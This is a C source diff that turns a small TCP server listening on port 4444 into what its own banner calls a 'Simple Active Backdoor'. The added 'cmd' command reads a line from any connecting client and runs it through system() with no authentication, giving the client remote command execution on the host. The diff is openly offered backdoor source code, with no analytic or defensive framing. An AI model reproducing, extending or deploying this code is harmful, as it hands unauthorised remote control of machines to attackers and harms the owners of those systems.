@@ -13,6 +13,7 @@
 #include <unistd.h>
 
 #define MY_PORT 4444
+#define VERSION_NUMBER "v0.02"
 
 void handle_clients();
 
@@ -89,6 +90,11 @@ int main(argc,argv)
 		if(clientfd > 0) {
 			printf("%s:%d client connected.\n",inet_ntoa(client.sin_addr),
 				MY_PORT);
+			memset(msg,0,sizeof(msg));
+			sprintf(msg,"SABD - Simple Active Backdoor %s\r\nType 'help' to find out what you can do...\r\n",VERSION_NUMBER);
+			if(send(clientfd,msg,strlen(msg),0) != strlen(msg)) {
+				puts("Couldn't send intro text.\n");
+			}
 			handle_clients(&clientfd);
 #if defined(_WIN32)
 			if(closesocket(clientfd) == 0) {
@@ -121,27 +127,43 @@ void handle_clients(socket)
 	int *socket;
 {
 	char msg[256];
+	char buf[64];
 	char cmd[64];
 	int i;
 	int c;
 
 	do {
+		memset(buf,0,sizeof(buf));
 		memset(cmd,0,sizeof(cmd));
 		send(*socket,"CMD >> ",7,0);
-		for(i=0; i<sizeof(cmd); ++i) {
+		for(i=0; i<sizeof(buf); ++i) {
 			recv(*socket,&c,1,0);
-			cmd[i] = c;
-			if(cmd[i] == 0x0A || c == 0x0D) {
+			buf[i] = c;
+			if(buf[i] == 0x0A || c == 0x0D) {
 				break;
 			}
 		}
+		sscanf(buf,"%s",cmd);
 
-		if(strncmp(cmd,"exit",4) == 0) {
+		if(strcmp(cmd,"exit") == 0) {
 			break;
-		} else if(strncmp(cmd,"help",4) == 0) {
+		} else if(strcmp(cmd,"help") == 0) {
 			memset(msg,0,sizeof(msg));
 			sprintf(msg,"Commands: [exit,help]\r\n");
 			send(*socket,msg,strlen(msg),0);
+		} else if(strcmp(cmd,"cmd") == 0) {
+			memset(buf,0,sizeof(buf));
+			memset(cmd,0,sizeof(cmd));
+			send(*socket,"Enter command: ",15,0);
+			for(i=0; i<sizeof(buf); ++i) {
+				recv(*socket,&c,1,0);
+				buf[i] = c;
+				if(buf[i] == 0x0A || c == 0x0D) {
+					break;
+				}
+			}
+			sscanf(buf,"%s",cmd);
+			system(cmd);
 		} else {
 			send(*socket,"Unknown command.\r\n",18,0);
 		}
